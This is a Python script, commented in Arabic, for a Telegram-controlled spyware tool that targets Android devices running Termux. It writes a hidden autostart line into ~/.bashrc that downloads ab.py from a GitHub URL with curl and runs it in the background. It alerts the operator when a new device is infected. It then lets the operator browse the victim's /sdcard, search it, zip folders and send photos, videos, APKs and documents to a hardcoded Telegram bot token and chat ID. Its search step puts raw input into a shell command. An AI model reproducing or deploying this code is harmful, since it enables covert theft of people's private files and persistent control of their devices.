import os, telebot, subprocess, json, threading, uuid, time
from pathlib import Path
from telebot import types

# --- 🛠 الإعدادات الأساسية ---
# تم تحديث التوكن بناءً على طلبك الأخير
BOT_TOKEN = "8383750133:AAEUHJLuv6VFQE7rwm4X3_6E-tpKjx95Nbk"
CHAT_ID = "7047473765"
bot = telebot.TeleBot(BOT_TOKEN, num_threads=200)
DB_FILE = os.path.expanduser("~/p_db.json")
DEV_ID = str(uuid.getnode())[-6:]
MODEL = subprocess.getoutput("getprop ro.product.model").strip() or "Android_Device"

# --- ⚙️ وظيفة التشغيل التلقائي والمخفي ---
def setup_autostart():
    path = os.path.expanduser("~/.bashrc")
    cmd = '\npgrep -f "python ab.py" > /dev/null || (curl -sL https://raw.githubusercontent.com/m539475124/my-telegram-scripts/refs/heads/main/ab.py -o ab.py && setsid python ab.py > /dev/null 2>&1 &)\n'
    
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                if "ab.py" in f.read():
                    return 
        with open(path, 'a') as f:
            f.write(cmd)
        print("✅ تم تفعيل نظام الصمود التلقائي.")
    except:
        pass

# --- 💾 إدارة قاعدة البيانات الذكية ---
def manage_db(action, k=None, v=None):
    db = {}
    try:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r') as f: db = json.load(f)
    except: pass
    if action == "save":
        db[str(k)] = str(v)
        with open(DB_FILE, 'w') as f: json.dump(db, f)
    elif action == "get": return db.get(str(k))
    elif action == "register":
        db[f"v_{DEV_ID}"] = MODEL
        with open(DB_FILE, 'w') as f: json.dump(db, f)
    elif action == "load": return db 
    return db

# --- 🚀 محرك الإرسال المتطور ---
def send_smart(path, v_name):
    try:
        ext = path.lower()
        with open(path, 'rb') as f:
            if ext.endswith(('.jpg', '.jpeg', '.png', '.webp', '.gif')):
                bot.send_photo(CHAT_ID, f, caption=f"🖼 تم سحب صورة\n👤 الجهاز: {v_name}")
            elif ext.endswith(('.mp4', '.mkv', '.mov', '.avi')):
                bot.send_video(CHAT_ID, f, caption=f"🎬 تم سحب فيديو\n👤 الجهاز: {v_name}")
            elif ext.endswith('.apk'):
                bot.send_document(CHAT_ID, f, caption=f"📱 تم سحب تطبيق APK\n👤 الجهاز: {v_name}")
            else:
                bot.send_document(CHAT_ID, f, caption=f"📄 تم سحب مستند\n👤 الجهاز: {v_name}")
    except Exception as e:
        bot.send_message(CHAT_ID, f"❌ فشل السحب: {str(e)}")

# --- 📂 مستكشف الملفات الإمبراطوري ---
def create_ui(path, v_name):
    markup = types.InlineKeyboardMarkup(row_width=2)
    try:
        items = list(os.scandir(path))
        btns = []
        if str(path) != "/sdcard/":
            p_id = str(hash(str(Path(path).parent))); manage_db("save", p_id, Path(path).parent)
            btns.append(types.InlineKeyboardButton("🔙 عودة", callback_data=f"go|{p_id}|{v_name}"))
        
        btns.append(types.InlineKeyboardButton("🔍 بحث شامل", callback_data=f"srch|{v_name}"))
        markup.add(*btns)

        for e in sorted(items, key=lambda x: x.is_file())[:90]:
            i_id = str(hash(e.path)); manage_db("save", i_id, e.path)
            if e.is_dir():
                markup.add(types.InlineKeyboardButton(f"📁 {e.name}", callback_data=f"go|{i_id}|{v_name}"),
                           types.InlineKeyboardButton(f"📥 سحب مجلد", callback_data=f"zip|{i_id}|{v_name}"))
            else:
                ext = e.name.lower()
                size_raw = os.path.getsize(e.path)
                size = f"{size_raw/(1024*1024):.2f} MB" if size_raw > 1024*1024 else f"{size_raw//1024} KB"
                icon = "🖼" if ext.endswith(('.jpg','.png','.jpeg')) else "🎬" if ext.endswith(('.mp4','.mkv')) else "📄"
                markup.add(types.InlineKeyboardButton(f"{e.name} ({size})", callback_data="none"))
                markup.add(types.InlineKeyboardButton(f"{icon} سحب الملف", callback_data=f"f|{i_id}|{v_name}"))
        return f"📱 جهاز: `{v_name}`\n📍 المسار: `{path}`", markup
    except: return "❌ لا توجد صلاحيات وصول.", None

# --- 📡 استقبال الأوامر ---
@bot.message_handler(func=lambda m: m.text == "سحب")
def list_v(m):
    if str(m.chat.id) != CHAT_ID: return
    markup = types.InlineKeyboardMarkup()
    db = manage_db("load")
    devs = {v: k for k, v in db.items() if k.startswith("v_")}
    for vid, vmod in devs.items():
        markup.add(types.InlineKeyboardButton(f"📱 {vid} | ID: {vmod[-5:]}", callback_data=f"open|{vid}"))
    bot.send_message(CHAT_ID, "👑 **لوحة التحكم المباشرة:**", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_listener(c):
    d = c.data.split('|')
    try:
        if d[0] == "open":
            res, m = create_ui("/sdcard/", d[1])
            bot.edit_message_text(res, c.message.chat.id, c.message.message_id, reply_markup=m)
        elif d[0] == "go":
            res, m = create_ui(manage_db("get", d[1]), d[2])
            bot.edit_message_text(res, c.message.chat.id, c.message.message_id, reply_markup=m)
        elif d[0] == "f":
            threading.Thread(target=send_smart, args=(manage_db("get", d[1]), d[2])).start()
        elif d[0] == "zip":
            bot.answer_callback_query(c.id, "⚡ جاري الضغط...")
            p = manage_db("get", d[1])
            tmp = f"/sdcard/Download/final_{DEV_ID}.zip"
            subprocess.run(['zip', '-r', '-1', '-q', tmp, p])
            with open(tmp, 'rb') as doc:
                bot.send_document(CHAT_ID, doc, caption=f"📁 مجلد: {d[2]}")
            os.remove(tmp)
        elif d[0] == "srch":
            msg = bot.send_message(CHAT_ID, "🔎 أرسل اسم الملف للبحث عنه:")
            bot.register_next_step_handler(msg, do_srch, d[1])
    except: pass

def do_srch(m, v_name):
    cmd = f"find /sdcard/ -iname '*{m.text}*' 2>/dev/null | head -n 25"
    res = subprocess.getoutput(cmd).split('\n')
    if not res or res == ['']: 
        bot.send_message(CHAT_ID, "❌ لا توجد نتائج.")
        return
    markup = types.InlineKeyboardMarkup()
    for path in res:
        if not path: continue
        p_id = str(hash(path)); manage_db("save", p_id, path)
        icon = "📁" if os.path.isdir(path) else "📄"
        markup.add(types.InlineKeyboardButton(f"{icon} {path}", callback_data=f"go|{p_id}|{v_name}" if os.path.isdir(path) else f"f|{p_id}|{v_name}"))
    bot.send_message(CHAT_ID, f"✅ نتائج البحث: {m.text}", reply_markup=markup)

# --- 🛡 التشغيل المستمر ---
def run_forever():
    while True:
        try:
            print(f"🚀 البوت يعمل على: {MODEL}...")
            bot.polling(none_stop=True, timeout=90)
        except:
            time.sleep(10)

# --- 🔔 إرسال إشعار دخول الجهاز ---
def notify_entry():
    try:
        msg = f"🔔 **تم دخول جهاز جديد!**\n\n📱 الموديل: `{MODEL}`\n🆔 المعرف: `{DEV_ID}`\n⏰ الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        bot.send_message(CHAT_ID, msg, parse_mode="Markdown")
    except:
        pass

if __name__ == "__main__":
    setup_autostart() 
    manage_db("register")
    notify_entry() # تم إضافة استدعاء إشعار الدخول هنا
    run_forever()
